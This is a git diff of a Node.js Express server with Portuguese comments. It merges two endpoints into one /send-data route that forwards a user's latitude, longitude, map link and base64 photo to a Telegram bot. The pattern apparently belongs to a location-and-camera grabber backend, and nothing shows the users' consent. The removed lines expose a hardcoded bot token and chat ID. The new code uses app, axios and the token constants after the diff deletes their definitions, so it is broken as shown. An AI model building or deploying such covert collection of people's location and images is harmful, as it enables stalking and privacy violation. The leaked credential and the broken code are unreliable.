@@ -1,74 +1,43 @@
-const express = require("express");
-const bodyParser = require("body-parser");
-const cors = require("cors");
-const axios = require("axios");
-const https = require("https");
+const FormData = require("form-data");
 
-const app = express();
-app.use(cors());
-app.use(bodyParser.json({ limit: "10mb" })); // aumenta limite para imagem grande
-
-// Substitua com os valores reais
-const TELEGRAM_BOT_TOKEN = "7674928346:AAEd6FNCSB_ozfmqs7islmmEaH6x8bWivVQ";
-const TELEGRAM_CHAT_ID = "1276935257";
-
-// Força uso de IPv4 e define timeout
-const httpsAgent = new https.Agent({ family: 4 });
-
-app.post("/send-location", async (req, res) => {
-  const { latitude, longitude, maps } = req.body;
-
-  const message = `A localização do usuário é:\nLatitude: ${latitude}\nLongitude: ${longitude}\nMaps: ${maps}`;
+app.post("/send-data", async (req, res) => {
+  const { latitude, longitude, maps, photo } = req.body;
 
   try {
+    // Envia a mensagem de localização
+    const message = `📍 Localização do usuário:\nLatitude: ${latitude}\nLongitude: ${longitude}\n${maps}`;
     await axios.post(
       `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
       {
         chat_id: TELEGRAM_CHAT_ID,
         text: message,
-      },
-      {
-        httpsAgent,
-        timeout: 5000, // 5 segundos de timeout
       }
     );
 
-    res.status(200).json({ success: true });
+    if (photo) {
+      // Remove o prefixo da base64
+      const base64Data = photo.replace(/^data:image\/\w+;base64,/, "");
+      const buffer = Buffer.from(base64Data, "base64");
+
+      const form = new FormData();
+      form.append("chat_id", TELEGRAM_CHAT_ID);
+      form.append("photo", buffer, {
+        filename: "photo.png",
+        contentType: "image/png",
+      });
+
+      // Envio via axios usando os headers corretos do form-data
+      await axios.post(
+        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
+        form,
+        { headers: form.getHeaders() }
+      );
+    }
+
+    res.json({ success: true });
   } catch (error) {
-    console.error("Erro ao enviar mensagem para o Telegram:", error.message || error);
-    res.status(500).json({ success: false, message: "Erro ao enviar a localização para o Telegram." });
+    console.error("Erro ao enviar para Telegram:", error.response?.data || error.message || error);
+    res.status(500).json({ success: false, message: "Erro ao enviar os dados." });
   }
-});
-
-app.post("/send-photo", async (req, res) => {
-  const { image } = req.body;
-
-  if (!image) {
-    return res.status(400).json({ success: false, message: "Imagem não fornecida" });
-  }
-
-  try {
-    // Envia a imagem base64 direto para Telegram (ele aceita data URI)
-    const response = await axios.post(
-      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
-      {
-        chat_id: TELEGRAM_CHAT_ID,
-        photo: image,
-      },
-      {
-        httpsAgent,
-        timeout: 5000,
-      }
-    );
-
-    res.json({ success: true, telegram_response: response.data });
-  } catch (error) {
-    console.error("Erro ao enviar foto para o Telegram:", error.message || error);
-    res.status(500).json({ success: false, message: "Erro ao enviar foto" });
-  }
-});
-
-app.listen(8088, () => {
-  console.log("Servidor rodando na porta 8088");
 });
 
